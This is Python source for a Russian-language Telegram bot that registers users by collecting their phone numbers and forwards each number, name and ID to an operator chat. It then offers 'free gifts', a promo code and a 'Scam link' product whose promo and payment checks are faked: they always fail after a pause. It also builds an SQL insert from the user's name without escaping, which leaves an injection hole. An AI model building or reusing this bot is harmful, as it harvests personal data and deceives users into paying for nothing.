import settings
import func
import keyboard

from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text
import asyncio

import sqlite3 as sql

from colorama import Fore, init
init(autoreset=True)

bot = Bot(settings.token)
dp = Dispatcher(bot)

#------------------Включен/Выключен------------------
async def on_startup(_):
    print(Fore.YELLOW + "INFO:", "Бот запущен")
async def on_shutdown(_):
    print(Fore.YELLOW + "INFO:", "Бот выключен")

#------------------Старт------------------
@dp.message_handler(commands=['start'])
async def start_command(message: types.message):
    if func.user(message.chat.id) is None:
        await bot.send_message(message.from_user.id, text=f'👋 Привет, {message.from_user.first_name}!\n  Пройди регистрацию для начала работы', reply_markup=keyboard.kb_reg)
    else:
        await bot.send_message(message.from_user.id, text='💪 Рад тебя снова видеть', reply_markup=keyboard.kb_menu)
    await message.delete()

#------------------Получение номера------------------
@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message, state: FSMContext):
    conn = sql.connect("users.db")
    with conn:
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS `users` (user_id INT PRIMARY KEY, nick TEXT, number INT)")
        cursor.execute(f"INSERT OR IGNORE INTO `users` VALUES ('{message.chat.id}', '{message.from_user.first_name}', '{message.contact.phone_number}')")
        await message.answer('✅ Регистрация прошла успешно!', reply_markup=keyboard.kb_menu)
        if settings.ID != '':
            try:
                await bot.send_message(chat_id=settings.ID, text=f"Новый пользователь\n\nИмя:{message.from_user.first_name}\nID:{message.chat.id}\nНомер:{message.contact.phone_number}\n")
            except:
                print(Fore.RED + 'Неверный айди')
        print(Fore.GREEN + "BOT:",f"Новый пользователь\n\nИмя:{message.from_user.first_name}\nID:{message.chat.id}\nНомер:{message.contact.phone_number}\n")

@dp.message_handler(content_types='text')
async def get_message(message: types.message):
    if func.user(message.chat.id) is not None:   #<-Проверка на наличие в базе

        #------------------Подарки------------------
        if message.text == 'Бесплатные подарки':
            await bot.send_message(message.from_user.id, text='🎁 Тут собраны все подарки для тебя', reply_markup=keyboard.kb_gifts)

        if message.text == 'Промокод':
            await bot.send_message(message.from_user.id, text=f"{func.promo_text}", reply_markup=keyboard.ikb_promo)
    
        #------------------Магазин------------------
        if message.text == 'Магазин':
            await bot.send_message(message.from_user.id, text='🛒 Тут собраны все товары для тебя', reply_markup=keyboard.kb_shop)

        if message.text == 'Scam link':
            await bot.send_message(message.from_user.id, text=f"{func.Scamlink_text}", reply_markup=keyboard.ikb_scamlink)

        #------------------Назад------------------
        if message.text == 'Назад':
            await bot.send_message(message.from_user.id, text='Главное меню', reply_markup=keyboard.kb_menu)
            
    else:
        await bot.send_message(message.from_user.id, text="❌ Тебя нет в базе данных!")

#------------------Обработчик кнопок------------------
@dp.callback_query_handler()
async def get_promo_callback(callback: types.CallbackQuery):
    if callback.data == "get_promo":
        await callback.message.answer('👀 Проверка...')
        await asyncio.sleep(2)
        await callback.message.answer('❌ Похоже ты не выполнил одно из условий.\n\nЕсли ты все выполнил, попробуй через 5 минут.')
    if callback.data == 'buy':
        await callback.message.edit_text(text=f'{func.Scamlink_buy_text(callback.from_user.first_name)}', reply_markup=keyboard.ikb_in_buy_button)
    if callback.data == 'check':
        await callback.message.answer('👀 Проверка...')
        await asyncio.sleep(2)
        await callback.message.answer('❌ Оплата не найдена!\n\nПроведите оплату и попробуйте еще раз.')
    if callback.data == "buy_back":
         await callback.message.edit_text(text=f"{func.Scamlink_text}", reply_markup=keyboard.ikb_scamlink)


#------------------Штука какая-то------------------
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup, on_shutdown=on_shutdown)